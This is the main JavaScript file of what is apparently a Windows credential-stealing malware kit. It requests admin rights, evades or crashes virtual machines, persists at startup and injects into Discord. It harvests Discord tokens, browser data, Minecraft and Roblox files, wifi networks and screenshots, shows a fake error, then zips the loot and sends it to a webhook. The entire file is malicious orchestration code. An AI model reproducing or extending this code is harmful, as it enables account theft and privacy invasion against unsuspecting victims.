const { sep, join, resolve } = require('path');
const { mkdtempSync } = require('fs');
const os = require('os');
const config = require('./config');
const { spawnSync, execSync } = require('child_process');
const { checkVM, killTasks } = require('./functions/anti-vm');
const sudo = require('sudo-prompt');
const { isDarwin } = require('./util/os');
const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
module.exports.tempFolder = tempFolder;
spawnSync('explorer', [tempFolder]);

if (os.platform() !== 'win32') process.exit();
try {
  execSync('net session');
} catch (e) {
  sudo.exec(resolve(__filename));
}

if (config.vmProtect && checkVM()) {
  if (config.bsodIfVm) {
    killTasks();
  } else {
    process.exit();
  }
} else {
  config.addToStartup && require('./functions/startup');
  config.discord.killProcess && require('./functions/kill-discord');
  config.discord.injectJs && require('./functions/discord-injection');
  require('./functions/grab-mc');
  require('./functions/grab-roblox');
  require('./functions/grab-browsers-data');
  if (!isDarwin()) require('./functions/screenshot');
  config.fakeError && require('./functions/fake-error');
  config.wifiNetworks && require('./functions/wifi-networks');

  require('./functions/grab-discord-token').then(() => {
    // require('./functions/nuke-discord-account');
    if (config.discord.autoJoinGuild && typeof config.discord.autoJoinGuild === 'string') require('./functions/auto-join-guild');

    require('./functions/zip').then(zipFile => {
      require('./functions/webhook')(zipFile);
    });
  });
}
